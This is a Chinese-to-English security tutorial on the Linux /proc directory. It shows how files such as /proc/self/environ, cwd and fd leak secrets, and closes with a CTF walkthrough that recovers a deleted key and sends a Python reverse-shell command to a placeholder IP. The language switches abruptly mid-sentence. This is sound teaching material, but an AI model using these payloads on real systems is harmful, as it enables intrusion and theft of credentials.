# PHP安全学习—Proc目录

本文首发于[先知社区](https://xz.aliyun.com/t/10579)

# 前言
> 不论是现实生活中的渗透测试，还是 CTF 竞赛中的赛题，都经常会出现`/proc`这个目录，利用该目录中的一些子目录或者文件不仅可以获取有用的`环境变量信息`甚至可以直接`Getshell`

# /proc 目录介绍
> 在 GUN/Linux 操作系统中的`/proc`是一个位于内存中的伪文件系统(或者叫做虚拟文件系统)。该目录下保存的不是真正的文件和目录，而是一些"运行时"的信息，例如系统内存、磁盘IO、设备挂载信息和硬件配置信息等。`proc`目录是一个控制中心，用户可以通过更改其中某些文件来改变内核的运行状态，`proc`目录也是内核提供给一个的查询中心，可以通过这些文件查看有关系统硬件及当前正在运行进程的信息。在 Linux 系统中，许多工具的数据来源正是`proc`目录中的内容，例如：`lsmod`命令就是`cat /proc/modules`命令的别名，`lspci`命令是`cat /proc/pci`命令的别名

> 简单一点来讲，`/proc`目录就是保存在系统中的信息，其包含许多以数字命名的子目录，这些数字代表着当前系统正在运行进程的进程号，里面包含对应进程相关的多个信息文件

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115457-9f2fb7c6-4e6c-1.png)

> 一般来说，在`/proc`目录下会存在以下的文件和目录

```bash
[1] /proc/pid
    每一个 /proc/pid 目录中还存在一系列目录和文件, 这些文件和目录记录的都是关于 pid 对应进程的信息. 例如在 /proc/pid 的目录下存在一个 task 目录, 在 task 目录下又存在 task/tid 这样的目录, 这个目录就是包含此进程中的每个线程的信息, 其中的 tid 是内核线程的 tid, 通过 GETDENTS 遍历 /proc 就能够看到所有的 /proc/pid 的目录, 当然通过 ls -al /proc 的方式也可以看到所有的信息

[2] /proc/tid
    每一个 /proc/tid 目录中还存在一系列目录和文件, 这些文件和目录记录的都是有关线程 tid 对应的信息, 这些信息与具体的 /proc/pid/task/tid 的目录相同, 所记录的信息也是相同的. 我们遍历 /proc 时并不能看到 /proc/tid 的信息, 同样通过 ls -al /proc 的方式也无法看到. 但是却可以通过 cd /proc/tid 进入到这个线程的内部, 通过 ps -T -p pid 的方式就能够看到 tid 的信息(传统的通过 ps | grep tid 是无法看到信息的)

[3] /proc/self
    这是一个 link, 当进程访问此 link 时, 就会访问这个进程本身的 /proc/pid 目录, 例如: 
    ls -al /proc/self
    lrwxrwxrwx 1 root root 0 Nov 15 11:28 /proc/self -> 1297307

[4] /proc/thread-self
    这是一个 link, 当访问此 link 时, 就会访问进程的 /proc/self/task/tid 目录, 例如:
    ls -al /proc/thread-self
    lrwxrwxrwx 1 root root 0 Nov 15 11:28 /proc/thread-self -> 1297727/task/1297727

[5] /proc/[a-z]*
    proc 下面还有许多其他的文件记录了系统中的各种信息
```
# /proc 目录下常见的文件介绍 
## apm 
> 高级电源管理(APM)版本信息及电池相关状态信息，通常由`apm`命令使用 

## buddyinfo 
> 用于诊断内存碎片问题的相关信息文件；

## cmdline 
> 在启动时传递至内核的相关参数信息，这些信息通常由`lilo`或`grub`等启动管理工具进行传递

## cpuinfo 
> 处理器的相关信息的文件 

## crypto 
> 系统上已安装的内核使用的密码算法及每个算法的详细信息列表

## diskstats 
> 每块磁盘设备的磁盘I/O统计信息列表(`内核2.5.69`以后的版本支持此功能)

## ioports 
> 当前正在使用且已经注册过的与物理设备进行通讯的输入-输出端口范围信息列表

## meminfo 
> 系统中关于当前内存的利用状况等的信息，常由`free`命令使用，可以使用文件查看命令直接读取此文件，其内容显示为两列，前者为统计属性，后者为对应的值

## version 
> 当前系统运行的内核版本号

# /proc/pid 目录下常见的文件介绍
> 在前面的图中不难看出在`/proc`目录下存在很多与进程相关的目录，接着来看看`/proc/pid`中记录的几个经常用到的进程的信息

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115513-a885d134-4e6c-1.png)

## attr
> `/proc/pid/attr`是一个目录，这个目录下的文件的作用是为安全模块提供了`API`，通过这些文件可以读取或者设置一些安全相关的选项，需要注意的是，只有内核开启了`CONFIG_SECURITY`选项时才能够看到这个目录

> 子目录下相关内容
```bash
[+] /proc/pid/attr/current
    这个文件的内容记录了当前进程的安全属性

[+] /proc/pid/attr/exec
    这个文件代表给进程的 execve 的属性

[+] /proc/pid/attr/fscreate
    这个文件代表进程与文件有关的权限, 包括open mkdir symlink mknod

[+] /proc/pid/attr/keycreate
    如果进程将安全上下文写入此文件, 那么所有创建 key 的行为都会被加载到此上下文中

[+] /proc/pid/attr/prev
    这个文件包含了进程在执行最后一个 execve 的安全上下文

[+] /proc/pid/attr/socketcreate
    如果一个进程向这个文件写入安全上下文, 那么之后所有的 sockets 的创建行为都会在此进程上下文中
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115544-bb26eac6-4e6c-1.png)

## cmdline
> `cmdline`文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息，可以通过查看`cmdline`目录获取启动指定进程的完整命令，例如：`cat /proc/pid/cmdline`

## cwd
> 这是一个当前的进程的工作目录，可以通过查看`cwd`文件获取目标指定进程环境的运行目录，例如：`cd /proc/pid/cwd; /bin/pwd`或者`ls -al /proc/pwd/cwd`

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115600-c4c8093e-4e6c-1.png)

## exe
> `exe`是一个指向启动当前进程的可执行文件(完整路径)的符号链接，通过`exe`文件可以获得指定进程的可执行文件的完整路径

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115614-cce0b896-4e6c-1.png)

> 在`Linux2.2`的内核及其之后`/proc/pid/exe`是直接执行的二进制文件的符号链接，在`Linux2.0`及其之前`/proc/pid/exe`是指向当前进程执行的二进制文件

## environ
> 该文件存储着当前进程的环境变量列表，包含的是当程序使用`execve`启动程序时的环境变量的值，其中的`entries`是通过`0x0`分割的，结尾是可能是`NULL`，彼此间用空字符(NULL)隔开，变量用大写字母表示，其值用小写字母表示，可以通过查看`environ`目录来获取指定进程的环境变量信息，在 CTF 赛题中可以用来读取环境变量中的`FLAG`或者`SECRET_KEY`

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115629-d5b9b274-4e6c-1.png)

## fd
> 这是一个子目录，包含了当前进程打开的每一个文件，每一个条目都是一个文件描述符，这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里，可以通过`fd`目录里的文件获得指定进程打开的每个文件的路径以及文件内容

> `fd`的另一个用途在于：在`linux`系统中，当一个程
The file was opened with `open()` but the file was not closed in the end. Even if the file was deleted from the outside, there will still be a file descriptor for this file in the `fd` file descriptor directory of the `/proc` process. Through this file descriptor, the content of the deleted file can be obtained.

```bash
[+] View the path of a file opened by a specified process
    ls -al /proc/pid/fd

[+] View the contents of a file opened by a specified process
    ls -al /proc/pid/fd/id
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115642-ddccc96a-4e6c-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115657-e6d2e512-4e6c-1.png)

## self
> In CTF questions, what is often needed is useful information in the current process, and in the above operations, they are basically process information specified in the target environment. At this time, you can obtain the information of the current process through `/proc/self`. Compared with `/proc/$pid`, `/proc/self` can not only obtain the information of this process more conveniently, but also avoid the changes in `fork` and `daemon`. If you are interested, you can take a look at [discussion on stackexchange](https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for)

````bas
[+] Get the full command to start the process
    cat /proc/self/cmdline

[+] Get the running directory and files in the target current process environment
    cd /proc/self/cwd; /bin/pwd
    ls /proc/self/cwd

[+] Get the full path to the executable file of the current process
    ls -al /proc/self/exe

[+] Get the environment variable information of the current process
    more /proc/self/environ

[+] Get the file contents opened by the current process
    more /proc/self/fd/id
```
> tip: When the website path cannot be found, you can use the `/proc/self/cwd` directory to read the `php` file source code of the `apache` process

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115719-f398181c-4e6c-1.png)

# Example question practice - PicDown
> Open the topic interface and only one login box. After entering something casually, I found that the form of `url` may have any file reading. After trying, I successfully downloaded `/etc/passwd`

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115736-fe333752-4e6c-1.png)

> Since you can download `/etc/passwd` and there are no other utilization points in the question, try to use `/proc/self/cmdline` to get the name of the current file: `python2 app.py`

> Successfully get the name of the current file and use `/proc/self/cwd` to get the file contents

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            Return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    Return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

```

> After observing the source code, I found the key point: `os.remove(SECRET_FILE)`, which caused the `SECRET_FILE` file to be deleted. Based on the above analysis, we can know that `fd` can be used to read deleted files, so you only need to burst the `id` value to successfully read the content of the deleted file. The `id=3` burst here

> The following are the regular steps, just use the `SECRET_FILE` you got to rebound the shell

```python
GET:
no_one_know_the_manager?key=IEcyndyXL52M6OSfyKnmz3kMIqePrpuHJVUs88J01Ko=&shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20211126115758-0b4f656e-4e6d-1.png)

# Summary
> In CTF questions, `/proc` is more common in Web-Python type competition questions, and there are many ways to use them. In addition to the methods used in the above practical example questions, sometimes you will also obtain useful information through `/proc/self/environ`, or use `/proc` and `LFI` to getshell`, etc.
> During the penetration test, when obtaining memory information (cat /proc/meminfo), CPU information (cat /proc/cpuinfo), etc., the `/proc` directory is often used; when utilizing the `php` file containing posture, it is often used to include the `/proc/self/environ` file.